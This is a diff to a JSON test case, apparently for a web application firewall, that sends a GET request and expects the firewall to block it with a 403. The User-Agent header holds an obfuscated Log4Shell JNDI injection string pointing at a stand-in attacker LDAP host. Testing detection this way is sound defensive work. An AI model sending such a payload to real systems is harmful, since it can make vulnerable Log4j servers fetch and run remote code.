@@ -16,7 +16,7 @@
       "headers": {
         "Host": "localhost",
         "User-Agent": "&#x24;&#00000000000000000000000000000000000000000000000123;jndi:ldap://evil.om/w}",
-        "Accept": "text\/html,application\/xhtml+xml,application\/xml;q=0.9,*\/*;q=0.8",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
         "Accept-Language": "en-us,en;q=0.5",
         "Accept-Encoding": "gzip,deflate",
         "Accept-Charset": "ISO-8859-1,utf-8;q=0.7,*;q=0.7",
@@ -29,13 +29,17 @@
       "uri": "/",
       "method": "GET",
       "http_version": 1.1,
-      "body": ""
+      "body": [
+        ""
+      ]
     },
     "response": {
       "headers": {
-        "Content-Type": "text\/xml; charset=utf-8"
+        "Content-Type": "text/xml; charset=utf-8"
       },
-      "body": "<html><body>OK</bod></html>"
+      "body": [
+        ""
+      ]
     },
     "expected": {
       "http_code": 403
